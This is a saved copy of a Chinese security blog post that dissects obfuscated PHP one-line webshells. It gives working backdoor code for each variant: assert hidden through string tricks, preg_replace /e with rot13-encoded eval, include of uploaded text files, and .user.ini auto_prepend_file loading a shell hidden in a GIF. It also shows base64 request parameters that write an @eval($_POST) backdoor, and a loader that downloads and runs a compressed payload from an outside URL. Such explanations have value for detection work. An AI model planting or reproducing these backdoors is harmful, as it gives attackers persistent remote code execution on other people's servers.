+<h1 id="变形二"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%BA%8C" class="headerlink" title="变形二"></a>变形二</h1><p>接收方<br>感觉这里并没有写对，应该是传入的两个参数都是base64加密的，经过解密后再执行，生成后门文件。<br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php">$a=str_replace(x,<span class="string">""</span>,<span class="string">"axsxxsxexrxxt"</span>);$a($_POST[<span class="string">"code"</span>]);</span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div></pre></td></tr></tbody></table></figure><p></p>
+<p>请求参数<br></p><figure class="highlight gauss"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?<span class="built_in">code</span>=<span class="built_in">fputs</span>(<span class="built_in">fopen</span>(base64_decode(J2MucGhwJw==),w),base64_decode(<span class="string">"PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=="</span>))</div></pre></td></tr></tbody></table></figure><p></p>
+<p>还原出的命令<br></p><figure class="highlight lisp"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">assert(<span class="name">fputs</span>(<span class="name">fopen</span>('c.php',w),<span class="string">"&lt;?php@eval($_POST[a]);?&gt;"</span>))</div></pre></td></tr></tbody></table></figure><p></p>
+<p>利用assert来执行命令，并且用字符串隐藏assert方法，并且利用它加上动态传入参数的方式构造后门。</p>
+<h1 id="变形三"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%B8%89" class="headerlink" title="变形三"></a>变形三</h1><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php">$_GET[<span class="string">'a'</span>]($_GET[<span class="string">'b'</span>]);</span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div></pre></td></tr></tbody></table></figure>
+<p>请求参数<br></p><figure class="highlight gauss"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?a=assert&amp;b=<span class="built_in">fputs</span>(<span class="built_in">fopen</span>(base64_decode(J2MucGhwJw==),w),base64_decode(<span class="string">"PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=="</span>))</div></pre></td></tr></tbody></table></figure><p></p>
+<p>完全利用动态参数传入的方式构造后门，将敏感函数和执行的命令动态传入，效果与变形二是一致的。</p>
+<h1 id="变形四"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E5%9B%9B" class="headerlink" title="变形四"></a>变形四</h1><figure class="highlight autoit"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">($code = $_POST[<span class="string">'code'</span>]) &amp;&amp;<span class="symbol">@preg_replace</span>(<span class="string">'/ad/e'</span>,<span class="string">'@'</span>.str_rot13(<span class="string">'riny'</span>).<span class="string">'($code)'</span>, <span class="string">'add'</span>)</div></pre></td></tr></tbody></table></figure>
+<p>改进的地方：<br>首先，将eval函数用str_rot13(‘riny’)隐藏。<br>然后，利用 e 修饰符，在preg_replace完成字符串替换后，使得引擎将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。</p>
+<h1 id="变形五"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%BA%94" class="headerlink" title="变形五"></a>变形五</h1><figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">'code'</span>]; <span class="keyword">include</span> (<span class="variable">$filename</span>);</div></pre></td></tr></tbody></table></figure>
+<p>改进的地方：<br>由于include方法可以直接编译任何格式的文件为php格式运行，因此可以上传一个txt格式的php文件，将真正的后门写在文本当中。</p>
+<h1 id="变形六"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E5%85%AD" class="headerlink" title="变形六"></a>变形六</h1><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">auto_prepend_file</span>=code.gif</div></pre></td></tr></tbody></table></figure>
+<p>上传.user.ini，并且写入auto_prepend_file=code.gif<br>将一句话隐藏在code.gif中，并且将它上传到同一目录下。</p>
+<p>改进的地方：<br>将一句话木马隐藏在图形文件中，并且利用用户配置文件将其自动加载到同目录的php文件下，使得所有正常php文件都毫不知情的中招。</p>
+<h1 id="变形七"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%B8%83" class="headerlink" title="变形七"></a>变形七</h1><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(empty($_SESSION[<span class="string">'api'</span>]))$_SESSION[<span class="string">'api'</span>]=<span class="keyword">substr</span>(file_get_contents(<span class="keyword">sprintf</span>(<span class="string">'%s?%s'</span>,<span class="keyword">pack</span>(<span class="string">"H*"</span>,<span class="string">'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067'</span>),uniqid())),<span class="number">3649</span>);</div><div class="line">@preg_replace(<span class="string">"~(.*)~ies"</span>,gzuncompress($_SESSION[<span class="string">'api'</span>]),null);</div></pre></td></tr></tbody></table></figure>
+<p>改进的地方：<br>第一，通过pack函数得到URL<br>第二，利用file_get_contents获得make.jpg。<br>第三，利用substr截取3649字节以后的内容。<br>第四，利用gzuncompress方法将3649字节以后的内容解压出来。<br>第五，用preg_replace方法的e操作符将代码执行。<br>还有很多后续操作……</p>
+<h1 id="后记"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%90%8E%E8%AE%B0" class="headerlink" title="后记"></a>后记</h1><p>以上为了试验操作的方便，采用的是Get方式获取PHP的执行代码，但实际上，由于URL长度的限制，一般采用Post的方式。由于PHP版本的不断更新，因此一些旧的方法可能已经不太好用，但是随着版本的更新，相信也会有更多越来越新奇的mm慢慢浮出水面，让我们拭目以待。</p>
+<p>另外除了这些一句话以外，还有一些不错的大马，例如rc-shell等，以及github上大量的webshell仓库。</p>
+<h1 id="参考资料"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blkstone.github.io/2016/07/21/php-webshell/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%88%9D%E7%BA%A7%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81PHP%E5%90%8E%E9%97%A8%E8%A7%A3%E6%9E%90">一句话木马初级篇：常见PHP后门解析 -  ArkTeam</a><br>[2] <a href="http://bobao.360.cn/news/detail/3310.html" target="_blank" rel="external">一款功能强大的Web shell工具RC-SHELL</a><br>[3] <a href="https://github.com/tennc/webshell" target="_blank" rel="external">github webshell</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="https://blkstone.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> #渗透测试 </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="https://blkstone.github.io/2016/07/21/0days-vendor/">从 Hacking Team 的泄露邮件来看 0day 市场的供应商</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="https://blkstone.github.io/2016/07/20/post-exploit-tech/">后渗透阶段常用技术总结 wooyun whitehatfest 2016</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/jia.js.下載" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2016/07/21/php-webshell/" data-title="常见php一句话webshell解析" data-url="http://blkstone.github.io/2016/07/21/php-webshell/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first" style="top: 5px; transform: rotateZ(-45deg); width: 100%;"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle" style="opacity: 0;"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last" style="top: -5px; transform: rotateZ(45deg); width: 100%;"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar sidebar-active" style="display: block; width: 320px;">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element" style="opacity: 1; display: block; transform: translateX(0px);">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element" style="opacity: 1; display: block; transform: translateX(0px);">
+          <img class="site-author-image" src="./常见php一句话webshell解析 __ Neurohazard_files/avatar.jpg" alt="Ray">
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element" style="opacity: 1; display: block; transform: translateX(0px);">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element" style="opacity: 1; display: block; transform: translateX(0px);">
+          <div class="site-state-item site-state-posts">
+            <a href="https://blkstone.github.io/archives">
+              <span class="site-state-item-count">566</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="https://blkstone.github.io/tags">
+              <span class="site-state-item-count">158</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element" style="opacity: 1; display: block; transform: translateX(0px);">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" style="opacity: 1; display: block; transform: translateX(0px);">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="./常见php一句话webshell解析 __ Neurohazard_files/cc-by-nc-sa.svg" alt="Creative Commons">
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active motion-element" style="opacity: 1; display: block; transform: translateX(0px);">
+          <div class="post-toc-indicator-top post-toc-indicator" style="opacity: 0;"></div>
+          <div class="post-toc" style="height: 1149px;">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E6%9C%80%E5%9F%BA%E7%A1%80%E7%9A%84-php-webshell"><span class="nav-number">1.</span> <span class="nav-text">最基础的 php webshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%B8%80"><span class="nav-number">2.</span> <span class="nav-text">变形一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%BA%8C"><span class="nav-number">3.</span> <span class="nav-text">变形二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%B8%89"><span class="nav-number">4.</span> <span class="nav-text">变形三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E5%9B%9B"><span class="nav-number">5.</span> <span class="nav-text">变形四</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%BA%94"><span class="nav-number">6.</span> <span class="nav-text">变形五</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E5%85%AD"><span class="nav-number">7.</span> <span class="nav-text">变形六</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%B8%83"><span class="nav-number">8.</span> <span class="nav-text">变形七</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%90%8E%E8%AE%B0"><span class="nav-number">9.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">10.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator" style="opacity: 0;"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  © &nbsp;  2015 - 
+  2018
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io/">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/index.js.下載"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/jquery.fancybox.pack.js.下載"></script>
+  <script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/fancy-box.js.下載"></script>
+
+
+  <script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/helpers.js.下載"></script>
+  
+
+  <script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/velocity.min.js.下載"></script>
+  <script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/velocity.ui.min.js.下載"></script>
+
+  <script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/motion_global.js.下載" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/search-toggle.js.下載"></script>
+
+  
+  
+<script type="text/javascript" src="./常见php一句话webshell解析 __ Neurohazard_files/bootstrap.scrollspy.js.下載" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config;executed=true">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config;executed=true">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script src="./常见php一句话webshell解析 __ Neurohazard_files/MathJax.js.下載" id=""></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+
+
+<div style="position: absolute; width: 0px; height: 0px; overflow: hidden; padding: 0px; border: 0px; margin: 0px;"><div id="MathJax_Font_Test" style="position: absolute; visibility: hidden; top: 0px; left: 0px; width: auto; padding: 0px; border: 0px; margin: 0px; white-space: nowrap; text-align: left; text-indent: 0px; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; font-size: 40px; font-weight: normal; font-style: normal; font-family: MathJax_Main, sans-serif;"></div></div></body></html>
